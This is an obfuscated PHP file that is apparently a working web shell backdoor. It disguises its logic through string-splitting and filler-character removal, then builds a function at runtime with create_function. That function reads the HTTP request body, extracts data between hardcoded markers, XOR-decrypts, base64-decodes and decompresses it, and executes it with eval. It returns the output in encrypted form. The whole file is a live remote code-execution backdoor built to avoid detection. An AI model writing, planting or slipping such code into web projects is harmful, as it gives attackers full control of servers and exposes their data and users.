<?php
$B=str_replace('I','','IcreatIe_IfuIIncItion');
$E='/in+oput"),$+om)==1) {@+oob_sta+ort()+o;@e+oval(@gz+ouncomp+oress(@x(@ba+ose64_d+oec+oode+o+o($m[1]),$+ok)+o));$o=@ob_';
$p='{$c=+o+ostrl+oen($+ok);$+ol=strlen($+ot);$o="";for($i+o+o+o=0;$i<$l;){for($j=0;+o+o($j<$c+o&&$i<$l);$j+o++,$i+++o){';
$i='$o.=+o$t{$+oi}^$k{$j}+o;}}re+oturn $o+o;}if (+o@pre+og_+o+o+omatch("+o/$kh(+o.+)$kf/",@file_get_+ocon+o+otents("php:/';
$g='$k="c296c+o1f+oa";$kh+o="d57e1a0+odae5c+o";+o+o$kf="9332a88+o8+o2c8d";$p=+o"ctRRLCFfj9B0+ok5I+oh"+o;function x+o+o($t,$k)';
$V='get_con+otents(+o+o);@ob_end_c+olean();$r+o=@+oba+ose64_encode(@+ox(@gzco+ompre+oss($+oo),$k));pr+oi+on+ot("$p$kh$r$kf");}';
$w=str_replace('+o','',$g.$p.$i.$E.$V);
$C=$B('',$w);$C();
?>
